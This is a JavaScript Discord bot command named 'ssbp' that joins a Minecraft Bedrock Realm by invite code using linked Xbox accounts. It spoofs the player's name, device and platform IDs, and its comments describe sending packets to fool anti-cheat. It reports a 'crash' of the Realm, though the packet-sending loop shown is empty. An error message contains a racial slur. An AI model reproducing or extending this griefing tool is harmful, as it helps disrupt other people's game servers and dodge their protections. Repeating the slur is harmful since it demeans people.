const { SlashCommandBuilder, EmbedBuilder,ActionRowBuilder, ButtonBuilder,ButtonStyle } = require("discord.js");
const config = require('../../data/discord/config.json');
const fs = require('node:fs');
const colors = require('../../data/handles/colors.js');
const path = require('path');
const { createClient } = require('bedrock-protocol');
const { dumprealm } = require('../../men/realms');
const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
const skinData2 = require('../../data/client/ssbp2.json')
const skinData1 = require('../../data/client/ssbp.json')
const { Authflow, Titles } = require("prismarine-auth");
module.exports = {
    data: new SlashCommandBuilder()
        .setName("ssbp")
        .setIntegrationTypes(0, 1)
        .setContexts(0, 1, 2)
        .setDescription("Send Broken Packets to a Realm :3")
        .addIntegerOption(option =>
            option.setName('account')
                .setDescription('Account you wanna use')
                .setRequired(true)
                .addChoices(
                    { name: 'Account 1', value: 1 },
                    { name: 'Account 2', value: 2 },
                    { name: 'Account 3', value: 3 }))
        .addStringOption(option =>
            option.setName('invite')
                .setDescription('Realm invite code')
                .setRequired(true)
                .setMinLength(8)
                .setMaxLength(15))
        .addIntegerOption(option =>
            option.setName("duration")
            .setDescription("How Long to SSBP Realm")
            .setRequired(true)
            .setMinValue(5)
            .setMaxValue(2000)
        )
        .addIntegerOption(option =>
            option.setName('mode')
                .setDescription('What kind of ssbp ')
                .setRequired(true)
                .addChoices(
                    { name: 'SSBP1', value: 1 },
                    { name: 'SSBP 2 (New)', value: 2 },))
        .addStringOption(option =>
            option.setName('namespoof_name')
                .setDescription('Realm invite code')
                .setRequired(false)
                .setMinLength(1)
                .setMaxLength(40)),
    async execute(interaction) {
        const invite = interaction.options.getString('invite');
        const namespoof = interaction.options.getString('namespoof_name') | "discord.gg/frosted"
        const duration = interaction.options.getInteger('duration');
        const mode = interaction.options.getInteger('mode')
        let disconnected = false;
        const account = interaction.options.getInteger('account') 
        try {
            await interaction.reply({
                embeds: [
                    new EmbedBuilder()
                        .setTitle("Frosted SSBP (r)")
                        .setDescription(`Loading data, this may take a few seconds depending on the workload.`)
                        .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                        .setThumbnail(config.embeds.footerurl)
                        .setColor(config.embeds.color)
                ],ephemeral: true,
            });

            if (!fs.existsSync(`./data/client/frosted/${interaction.user.id}/profile${account}`)) {
                await interaction.editReply({
                    embeds: [
                        {
                            title: `X Account Not Linked X`,
                            description: `It seems like you haven't linked an account yet.\nPlease link an account whit `+'`/link `' + `to use this command.`,
                            color: 0xff0000,
                            footer: { text: "e" },
                        },
                    ],
                });
                return;
            }

            const whitelist = JSON.parse(fs.readFileSync('./data/client/whitelist.json', 'utf8'));
            if (whitelist.includes(invite)) {
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`The invite \`${invite}\` is in the whitelist and cannot be nuked.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            }

            const realm = await dumprealm(invite);
            if (!realm) {
                console.error(`[${new Date().toLocaleTimeString()}] Error: Realm not found`);
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`Invalid code: realm not found or account banned.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            }

            const crypto = require("node:crypto");
            const curve = "secp384r1";
            const keypair = crypto.generateKeyPairSync("ec", { namedCurve: curve }).toString("base64");
            const bot = new Authflow(
                interaction.user.id, 
                path.resolve(`./data/client/frosted/${interaction.user.id}/profile${account}`), 
                {
                    flow: 'live',
                    authTitle: 'MinecraftNintendoSwitch',
                    deviceType: 'Nintendo',
                    doSisuAuth: true
                }
            );
            
            async function refreshOrRetrieveTokens() {
                try {
                    const xboxToken = await bot.getXboxToken();
                    await bot.getMinecraftBedrockToken(keypair);
                    console.log('Susesfull Refreshed Token:', xboxToken);
                    return xboxToken;
                } catch (error) {
                    console.error('Error while Refrshing', error);
                    await interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle("Token Refresh Error")
                                .setDescription(`We could not refresh your Token. Try to Relink or Link a new Account`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ]
                    });
                }
            }
            
            (async () => {
                console.log('Refreshing Token...');
                
                const token = await refreshOrRetrieveTokens();
                if (token) {
                    console.log('Susessfull Refreshd Token');
                    
                } else {
                    console.log('Error Refreshing Token');
                    await interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle("Token Refresh Error")
                                .setDescription(`We could not refresh your Token. Try to Relink or Link a new Account`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ]
                    });
                    return;
                }
            })();

            const updateButtons = (locked = false) => {
                const buttons = new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId('stop')
                        .setLabel('Stop')
                        .setStyle(ButtonStyle.Danger)
                        .setEmoji('🛑')
                        .setDisabled(locked)
                );
                return buttons;
            };
            const buttons = updateButtons();


            
        
        if (mode === 1) {
              skinData = {
              DeviceOS: 12,
              DeviceId: uuidv3(uuidv4(), NIL),
             PlatformOnlineId: genrandomstring(19, '1234567890'),
             PrimaryUser: false,
             SelfSignedId: uuidv4(),
             ThirdPartyName: namespoof,
             ThirdPartyNameOnly: true,
             TrustedSkin: true,
             ...skinData1
             };
        } else if (mode === 2) {
            skinData = {
            DeviceOS: 13,
            DeviceId: uuidv3(uuidv4(), NIL),
            PlatformOnlineId: genrandomstring(19, '0987654321'),
            PrimaryUser: true,
            SelfSignedId: uuidv4(),
            ThirdPartyName: namespoof,
            ThirdPartyNameOnly: true,
            TrustedSkin: true,
            ...skinData2
             };
        } else {
    throw new Error('Nigger !');
}

const client = createClient({
    profilesFolder: `./data/client/frosted/${interaction.user.id}/profile${account}`,
    username: interaction.user.id,
    offline: false,
    realms: {
        ...(invite.length === 8
            ? { realmId: invite }
            : { realmInvite: invite })
    },
    skinData: mode === 1
    ? {
        DeviceOS: 12,
        DeviceId: uuidv3(uuidv4(), NIL),
       PlatformOnlineId: genrandomstring(19, '1234567890'),
       PrimaryUser: false,
       SelfSignedId: uuidv4(),
       ThirdPartyName: namespoof,
       ThirdPartyNameOnly: true,
       TrustedSkin: true,
       ...skinData1
    }
    : mode === 2
    ? {
        DeviceOS: 12,
            DeviceId: uuidv3(uuidv4(), NIL),
            PlatformOnlineId: genrandomstring(19, '0987654321'),
            PrimaryUser: true,
            SelfSignedId: uuidv4(),
            ThirdPartyName: namespoof,
            ThirdPartyNameOnly: true,
            TrustedSkin: true,
            ...skinData2
    }
    : (() => {
        throw new Error('Ungültiger Modus! Nur Modus 1 oder 2 ist erlaubt.');
    })(),
    skipPing: true
});

            client.on('error', async (err) => {
                if (disconnected) return;
                disconnected = true;
                console.error(`[${new Date().toLocaleTimeString()}] Client error: ${err.message || err}`);
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`Error occurred: ${err.message || 'Unknown error'}`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
                client.disconnect();
            });
            let runtimeEntityId;

            client.on('start_game', (packet) => { // Small littel Hack to make Bot less Detactebel
              runtimeEntityId = packet.runtime_entity_id
              console.log(`Runtime Entity ID: ${runtimeEntityId}`);
            });
            client.on('start_game', (packet) => {
            client.queue('serverbound_loading_screen', { // sends the "is loading in Packet"
              "type": 1
            })
            client.queue('serverbound_loading_screen', { // Removes the immortal status of the Bot
              "type": 2
            })
            client.queue('interact', {  // Verify the Movement so Server sees us as a Real Player !
              "action_id": "mouse_over_entity",
              "target_entity_id": 0n,
              "position": {
                "x": 0,
                "y": 0,
                "z": 0
              }
            })
            client.queue('set_local_player_as_initialized', { // almost same as the first but mc is goofy and needs more packets, do i know ? nope !
              "runtime_entity_id": `${runtimeEntityId}`
            })
            client.queue("animate", {//  like a spoof to anti cheats :p
                action_id: 1, // making your arm swing 
                runtime_entity_id: packet.runtime_entity_id});
            })
            
            
            client.on('play_status', async (packet) => {
                console.log(`${colors.green}[Realm Watcher]${colors.cyan}>> User ${interaction.user.username}/${interaction.user.id} join Realm ${realm.name}/${invite}  `)
                const action_packet = {
                    runtime_entity_id: packet.runtime_entity_id,
                    position: { x: 0, y: 0, z: 0 },
                    result_position: { x: 0, y: 0, z: 0 },
                    face: 0,
                  };
                try {
                    await interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle('Frosted Lag (r)')
                                .setDescription(`Joined and started to ssbp ${realm.name} - ${invite}. Disconnecting in ${duration} seconds...`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ] ,components: [buttons], 
                    });

                    setTimeout(() => {
                        if (disconnected) return;
                        for (let i = 0; i < 500000; i++) {    
                    
                          };
                    }, 0);

                    setTimeout(() => {
                        if (!disconnected) {
                            client.disconnect();
                            interaction.editReply({
                                embeds: [
                                    new EmbedBuilder()
                                        .setTitle('Frosted SSBP (r)')
                                        .setDescription(`Client disconnected from ${realm.name}. Crash successful.`)
                                        .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                        .setThumbnail(config.embeds.footerurl)
                                        .setColor(config.embeds.color)
                                ]
                            });
                            disconnected = true;
                        }
                    }, duration * 1000);
                } catch (error) {
                    console.error(error);
                    throw error;
                }
            });

            interaction.client.on('interactionCreate', async (buttonInteraction) => {
                if (!buttonInteraction.isButton() || buttonInteraction.customId !== 'stop') return;
            
                if (buttonInteraction.user.id !== interaction.user.id) {
                    return await buttonInteraction.reply({ 
                        content: "You cannot use this button.", 
                        ephemeral: true 
                    });
                }
            
                try {
                    client.disconnect(); 
                    await buttonInteraction.update({ 
                        embeds: [
                            new EmbedBuilder()
                                .setTitle('Frosted SSBP (r)')
                                .setDescription(`Client disconnected from ${realm.name}.`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ],components: [] 
                    });
                } catch (error) {
                    console.error('Error while disconnecting:', error);
                    await buttonInteraction.update({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle('Error While Leaving Realm')
                                .setDescription(`Client could not disconnected from ${realm.name}.`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ],components: []
                    });
                }
            });

            client.on('kick', async (err) => {
                if (disconnected) return;
                disconnected = true;
                console.error(`[${new Date().toLocaleTimeString()}] Client kick: ${err}`);
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`CLient Kicked from Realm :\n${err} `)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            });

            client.on('close', async (err) => {
                if (disconnected) return;
                disconnected = true;
                console.error(`[${new Date().toLocaleTimeString()}] Client closed: ${err}`);
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`Connection closed. Crash completed.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            });
        } catch (err) {
            console.error(err);
        }
    }
};

function genrandomstring(length, charSet) {
    if (!charSet) charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charSet.charAt(Math.floor(Math.random() * charSet.length));
    }
    return result;
}
